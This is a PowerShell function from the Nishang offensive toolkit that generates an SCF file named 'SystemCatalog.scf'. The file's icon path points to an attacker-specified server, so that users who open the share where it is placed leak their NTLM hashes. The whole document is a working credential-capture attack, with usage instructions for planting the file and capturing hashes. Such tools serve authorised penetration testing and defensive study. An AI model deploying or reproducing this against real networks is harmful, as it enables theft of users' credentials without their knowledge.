function Out-SCF
{
<#
.SYNOPSIS
Nishang script useful for creating SCF files which could be used to capture NTLM hashes.

.DESCRIPTION
The script generates a SCF file. The file (default name "SystemCatalog.scf") needs to be 
put on a share. Whenever a user opens the file on the share, his credentials are sent to the specifed capture server. 
The IP address of the capture server is specifed in the icon field.

There are various good servers to capture hashes in this way, a PowerShell one
is Inveigh (https://github.com/Kevin-Robertson/Inveigh)

The script is based on a blog by Rob Fuller (@mubix)

.PARAMETER IPAddress
IPAddress of the capture server.

.PARAMETER OutputPath
Path to the .scf file to be generated. Default is with the name SystemCatalog.scf in the current directory.

.EXAMPLE
PS > Out-SCF IPAddress 192.168.230.1

Put the generated scf file in a shared folder. When a user opens the share (it is not required to open the scf file), 
his NTLM hashes can be captured on the capture server running on the specified IP.

.LINK
https://room362.com/post/2016/smb-http-auth-capture-via-scf
https://github.com/samratashok/nishang
#> 

    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $IPAddress,

        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $OutputPath = "$pwd\SystemCatalog.scf"
    )

    
    $scf = @"
[Shell]
Command=2
IconFile=\\$IPAddress\share\test.ico
[Taskbar]
Command=ToggleDesktop
"@

    Out-File -InputObject $scf -FilePath $OutputPath -Encoding default
    Write-Output "SCF file written to $OutputPath"

    Write-Output "Put $OutputPath on a share."
    
}

